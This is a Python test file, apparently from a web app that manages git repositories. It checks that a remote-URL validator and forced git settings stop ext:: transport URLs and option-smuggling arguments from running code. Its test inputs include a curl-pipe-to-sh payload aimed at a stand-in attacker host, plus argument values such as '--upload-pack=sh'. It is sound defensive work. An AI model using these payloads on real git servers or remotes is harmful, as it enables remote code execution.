"""The three ways a remote URL or a ref name could have run code.

Plain ``unittest`` against the real git binary, like ``test_git_cli`` — no
database, so these run anywhere git does.

Each class here corresponds to one defect found while reviewing this app for
installation on zenobia. All three were reachable only because no host installed
``toto.repo``; enabling it makes them live, and remotes are now a wanted
feature rather than an excluded one.
"""

import subprocess
import tempfile
from pathlib import Path
from unittest import TestCase

from toto.repo import git_cli, remote_urls


class RemoteUrlValidatorTests(TestCase):
    """The rule that let ``ext::`` through, and what replaced it.

    The old test was ``url.startswith((...)) or "@" in url``. The second arm was
    meant to admit ``git@github.com:me/thing.git`` and admitted anything with an
    at-sign in it.
    """

    def test_the_exploit_the_old_rule_accepted(self):
        """`ext::` hands git a SHELL COMMAND, not a URL."""
        payload = "ext::sh -c 'curl http://evil.example/x | sh' @"
        # The old rule's own expression, for the record:
        self.assertIn("@", payload, "the old rule would have accepted this")
        with self.assertRaises(remote_urls.InvalidRemoteURL) as caught:
            remote_urls.validate_remote_url(payload)
        self.assertIn("ext::", str(caught.exception))

    def test_every_transport_helper_is_refused_not_just_ext(self):
        """An allowlist of forms, not a blocklist of prefixes — a blocklist is
        wrong the first time git gains another helper."""
        for url in ("ext::sh -c whoami @", "fd::17/foo", "transport::x @",
                    "anything::at all @"):
            with self.subTest(url=url):
                with self.assertRaises(remote_urls.InvalidRemoteURL):
                    remote_urls.validate_remote_url(url)

    def test_real_remotes_still_work(self):
        for url in (
            "https://github.com/owner/repo.git",
            "http://gitea.internal/owner/repo.git",
            "ssh://git@github.com:22/owner/repo.git",
            "git://git.kernel.org/pub/scm/git/git.git",
            "git@github.com:owner/repo.git",          # the scp form
            "gitea@gitea.internal:owner/repo.git",
        ):
            with self.subTest(url=url):
                self.assertEqual(remote_urls.validate_remote_url(url), url)

    def test_local_paths_and_file_urls_are_refused(self):
        for url in ("file:///etc", "/etc/passwd", "../../elsewhere", "C:\\repo"):
            with self.subTest(url=url):
                with self.assertRaises(remote_urls.InvalidRemoteURL):
                    remote_urls.validate_remote_url(url)

    def test_option_shaped_and_malformed_values_are_refused(self):
        for url in ("--upload-pack=sh", "-x", "", "   ",
                    "https://", "https:// host/x", "https://h/x\nmore=1",
                    "h" * (remote_urls.MAX_URL_LENGTH + 1)):
            with self.subTest(url=repr(url)):
                with self.assertRaises(remote_urls.InvalidRemoteURL):
                    remote_urls.validate_remote_url(url)

    def test_the_message_explains_rather_than_just_refusing(self):
        """"That does not look like a git remote URL" is a baffling answer to a
        URL git would in fact accept."""
        with self.assertRaises(remote_urls.InvalidRemoteURL) as caught:
            remote_urls.validate_remote_url("ext::sh -c whoami @")
        message = str(caught.exception)
        self.assertIn("run a command", message)
        self.assertIn("ssh://", message)


class HardeningReachesGitTests(TestCase):
    """The forced config is not decoration — assert git actually resolves it."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix="repo-sec-")
        self.addCleanup(self.tmp.cleanup)
        self.wt = Path(self.tmp.name) / "wt"
        git_cli.init(self.wt)

    def _config(self, key):
        return git_cli.run_git(
            ["config", "--get", key], cwd=self.wt, check=False).stdout.strip()

    def test_every_hardening_setting_is_in_effect(self):
        for setting in git_cli.HARDENING:
            key, _, value = setting.partition("=")
            with self.subTest(key=key):
                self.assertEqual(self._config(key), value)

    def test_a_poisoned_config_still_cannot_execute(self):
        """The defence in depth that matters.

        ``remote_urls`` stops such a URL being STORED. This proves that one
        which arrived by another road — a repository whose config already held
        it, or a row written before the validator existed — still cannot run.
        """
        canary = Path(self.tmp.name) / "pwned"
        # Written directly into .git/config, exactly as `git remote add` would.
        subprocess.run(
            ["git", "remote", "add", "origin",
             f"ext::sh -c 'touch {canary}' @"],
            cwd=str(self.wt), capture_output=True, text=True, check=True)

        result = git_cli.run_git(["fetch", "origin"], cwd=self.wt, check=False)

        self.assertNotEqual(result.code, 0, "the fetch should have been refused")
        self.assertFalse(
            canary.exists(),
            "git EXECUTED the ext:: command — protocol.ext.allow is not in effect")


class OptionSmugglingTests(TestCase):
    """Values that reach git in option position, straight off a URL.

    ``branch_create``/``branch_delete``/``merge`` already terminate with ``--``.
    These three cannot: for ``checkout`` a ``--`` means "pathspecs follow", so
    it has to come after the branch; ``read-tree`` and ``show`` take a revision,
    which is not a pathspec either.
    """

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(prefix="repo-opt-")
        self.addCleanup(self.tmp.cleanup)
        self.wt = Path(self.tmp.name) / "wt"
        git_cli.init(self.wt)

    def test_refuse_option_like_names_the_argument(self):
        with self.assertRaises(git_cli.GitError) as caught:
            git_cli.refuse_option_like("--upload-pack=sh", "a branch name")
        self.assertIn("a branch name", str(caught.exception))

    def test_ordinary_values_pass_through_untouched(self):
        for value in ("main", "feature/x", "a-b_c.d", "0" * 40):
            with self.subTest(value=value):
                self.assertEqual(
                    git_cli.refuse_option_like(value, "a branch name"), value)

    def test_checkout_refuses_an_option_shaped_branch(self):
        with self.assertRaises(git_cli.GitError):
            git_cli.checkout(self.wt, "--upload-pack=sh")

    def test_show_commit_refuses_an_option_shaped_sha(self):
        with self.assertRaises(git_cli.GitError):
            git_cli.show_commit(self.wt, "--output=/tmp/x")

    def test_restore_to_refuses_an_option_shaped_sha(self):
        class _User:
            username = "alice"
            email = "alice@example.com"

            def get_full_name(self):
                return "Alice"

        with self.assertRaises(git_cli.GitError):
            git_cli.restore_to(self.wt, "--reset", _User())
